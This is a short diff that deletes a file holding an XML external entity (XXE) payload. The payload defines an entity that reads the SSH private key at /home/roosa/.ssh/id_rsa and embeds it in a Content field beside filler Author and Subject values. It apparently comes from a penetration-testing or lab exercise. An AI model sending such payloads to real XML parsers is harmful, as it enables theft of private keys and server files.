@@ -1,9 +1,0 @@
-<!DOCTYPE lfi [
-  <!ELEMENT lfi ANY>
-  <!ENTITY boo SYSTEM  "file:///home/roosa/.ssh/id_rsa">
-  ]>
-  <lfi>lfi
-      <Author>dsfdsf</Author>>
-      <Subject>dsfdsf</Subject>>
-      <Content>&boo;</Content>>
-  </lfi>
